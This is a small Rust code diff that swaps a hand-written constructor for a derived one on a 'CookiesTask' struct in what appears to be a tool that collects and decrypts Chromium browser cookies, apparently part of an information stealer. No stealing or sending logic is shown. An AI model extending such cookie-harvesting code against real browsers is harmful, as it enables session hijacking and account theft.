@@ -2,6 +2,7 @@ use crate::alloc::borrow::ToOwned;
 use crate::chromium::{BrowserData, decrypt_data};
 use crate::{Cookie, SqliteDatabase, read_and_collect_unique_records, to_string_and_write_all};
 use alloc::sync::Arc;
+use derive_new::new;
 use collector::{Browser, Collector};
 use database::TableRecord;
 use filesystem::FileSystem;
@@ -16,14 +17,9 @@ const COOKIES_ENCRYPTED_VALUE: usize = 5;
 const COOKIES_PATH: usize = 6;
 const COOKIES_EXPIRES_UTC: usize = 7;
 
+#[derive(new)]
 pub(super) struct CookiesTask {
     browser: Arc<BrowserData>,
-}
-
-impl CookiesTask {
-    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
-        Self { browser }
-    }
 }
 
 impl<C: Collector, F: FileSystem> Task<C, F> for CookiesTask {
